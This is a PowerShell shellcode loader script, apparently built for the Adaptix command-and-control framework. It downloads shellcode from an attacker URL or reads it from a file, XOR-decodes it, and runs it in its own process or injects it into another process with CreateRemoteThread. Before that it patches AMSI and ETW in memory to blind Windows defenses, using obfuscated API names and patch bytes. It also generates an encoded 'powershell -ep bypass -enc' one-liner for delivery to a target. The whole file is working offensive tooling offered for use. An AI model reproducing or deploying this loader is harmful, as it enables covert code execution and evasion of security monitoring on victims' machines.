# Adaptix shellcode loader
# Attack box : .\loader_adaptix.ps1 -Url http://<ip>/agent.bin -Gen
# Target     : powershell -ep bypass -enc <output>

param(
    [string]$Url    = "",
    [string]$File   = "",
    [int]   $Proc   = 0,
    [byte]  $Key    = 0,
    [switch]$Thread,
    [switch]$Gen
)

$script:_path = $PSCommandPath

# ── helpers ──────────────────────────────────────────────────────────────────
function _u([long]$n)              { [System.UIntPtr]::new([uint64]$n) }
function _x([byte[]]$b,[byte]$k)   { if($k-eq0){return $b}; [byte[]]($b|%{$_-bxor$k}) }
function _s([int[]]$a)             { [string]::new([char[]]$a) }

# ── Win32 ─────────────────────────────────────────────────────────────────────
function _load_ni {
    try{$null=[NI]}catch{
        Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class NI {
    [DllImport("ker"+"nel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("ker"+"nel32")] public static extern IntPtr GetProcAddress(IntPtr h,string p);
    [DllImport("ker"+"nel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("ker"+"nel32")] public static extern bool   VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
    [DllImport("ker"+"nel32")] public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
    [DllImport("ker"+"nel32")] public static extern bool   EnumSystemLocalesA(IntPtr cb,uint f);
    [DllImport("ker"+"nel32")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr st,IntPtr p,uint f,IntPtr id);
    [DllImport("ker"+"nel32")] public static extern uint   WaitForSingleObject(IntPtr h,uint ms);
    [DllImport("ker"+"nel32")] public static extern IntPtr OpenProcess(uint a,bool i,int pid);
    [DllImport("ker"+"nel32")] public static extern IntPtr VirtualAllocEx(IntPtr hp,IntPtr a,UIntPtr s,uint t,uint p);
    [DllImport("ker"+"nel32")] public static extern bool   WriteProcessMemory(IntPtr hp,IntPtr a,byte[] b,UIntPtr s,out UIntPtr w);
    [DllImport("ker"+"nel32")] public static extern bool   VirtualProtectEx(IntPtr hp,IntPtr a,UIntPtr s,uint p,out uint o);
    [DllImport("ker"+"nel32")] public static extern IntPtr CreateRemoteThread(IntPtr hp,IntPtr ta,uint ss,IntPtr sa,IntPtr p,uint f,IntPtr id);
    [DllImport("ker"+"nel32")] public static extern bool   CloseHandle(IntPtr h);
}
'@ -EA Stop
    }
}

# ── patches ───────────────────────────────────────────────────────────────────
function _patch_mem([IntPtr]$ptr,[byte[]]$raw) {
    $op=[uint32]0; $len=_u $raw.Length
    [NI]::VirtualProtect($ptr,$len,0x40,[ref]$op)|Out-Null
    [Runtime.InteropServices.Marshal]::Copy($raw,0,$ptr,$raw.Length)
    [NI]::VirtualProtect($ptr,$len,$op,[ref]$op)|Out-Null
}

function _amsi {
    _load_ni
    $h  = [NI]::LoadLibrary((_s @(97,109,115,105,46,100,108,108)))
    $fn = [NI]::GetProcAddress($h,(_s @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)))
    if($fn-eq[IntPtr]::Zero){Write-Host "[-] amsi ptr null";return}
    # B8 57 00 07 80 C3  xor'd 0x37
    _patch_mem $fn (_x @(0x8F,0x60,0x37,0x30,0xB7,0xF4) 0x37)
    Write-Host "[+] amsi"
}

function _etw {
    _load_ni
    $h  = [NI]::GetModuleHandle((_s @(110,116,100,108,108,46,100,108,108)))
    $fn = [NI]::GetProcAddress($h,(_s @(69,116,119,69,118,101,110,116,87,114,105,116,101)))
    if($fn-eq[IntPtr]::Zero){Write-Host "[-] etw ptr null";return}
    # 48 33 C0 C3  xor'd 0x37
    _patch_mem $fn (_x @(0x7F,0x04,0xF7,0xF4) 0x37)
    Write-Host "[+] etw"
}

# ── injection ─────────────────────────────────────────────────────────────────
function _self([byte[]]$sc,[bool]$thread) {
    _load_ni
    $ptr=[NI]::VirtualAlloc([IntPtr]::Zero,(_u $sc.Length),0x3000,0x04)
    [Runtime.InteropServices.Marshal]::Copy($sc,0,$ptr,$sc.Length)
    $op=[uint32]0
    [NI]::VirtualProtect($ptr,(_u $sc.Length),0x20,[ref]$op)|Out-Null
    if($thread){
        $ht=[NI]::CreateThread([IntPtr]::Zero,0,$ptr,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [NI]::WaitForSingleObject($ht,0xFFFFFFFF)|Out-Null
    } else {
        [NI]::EnumSystemLocalesA($ptr,0)|Out-Null
    }
}

function _remote([byte[]]$sc,[int]$pid) {
    _load_ni
    $hp=[NI]::OpenProcess(0x1F0FFF,$false,$pid)
    $rp=[NI]::VirtualAllocEx($hp,[IntPtr]::Zero,(_u $sc.Length),0x3000,0x04)
    $wr=[UIntPtr]::Zero
    [NI]::WriteProcessMemory($hp,$rp,$sc,(_u $sc.Length),[ref]$wr)|Out-Null
    $op=[uint32]0
    [NI]::VirtualProtectEx($hp,$rp,(_u $sc.Length),0x20,[ref]$op)|Out-Null
    $ht=[NI]::CreateRemoteThread($hp,[IntPtr]::Zero,0,$rp,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [NI]::WaitForSingleObject($ht,10000)|Out-Null
    [NI]::CloseHandle($ht)|Out-Null; [NI]::CloseHandle($hp)|Out-Null
    Write-Host "[+] remote pid=$pid"
}

# ── main ──────────────────────────────────────────────────────────────────────
function Run([string]$Url,[string]$File,[int]$Proc,[byte]$Key,[bool]$Thread) {
    _amsi; _etw

    [byte[]]$sc=@()
    if($Url-ne""){
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0')
        $sc=$wc.DownloadData($Url)
        Write-Host "[*] $($sc.Length)b from $Url"
    } elseif($File-ne""){
        $sc=[IO.File]::ReadAllBytes($File)
        Write-Host "[*] $($sc.Length)b from $File"
    } else { Write-Host "[-] need -Url or -File"; return }

    if($Key-ne0){ $sc=_x $sc $Key }
    if($Proc-gt0){ _remote $sc $Proc } else { _self $sc $Thread }
    Write-Host "[+] done"
}

# ── gen mode: print the -enc delivery command ─────────────────────────────────
if($Gen) {
    $src=[IO.File]::ReadAllText($script:_path)
    $args_  = if($Url-ne""){"-Url '$Url'"}elseif($File-ne""){"-File '$File'"}else{"-Url '<URL>'"}
    if($Proc-gt0)    { $args_+=" -Proc $Proc" }
    if($Key-ne0)    { $args_+=" -Key 0x$($Key.ToString('X2'))" }
    if($Thread)     { $args_+=" -Thread" }
    $cmd  = "$src`n`nRun $args_"
    $enc  = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
    Write-Host "powershell -ep bypass -enc $enc"
    return
}

# ── direct run ────────────────────────────────────────────────────────────────
if($Url-ne""-or$File-ne""){
    Run $Url $File $Proc $Key ([bool]$Thread)
}
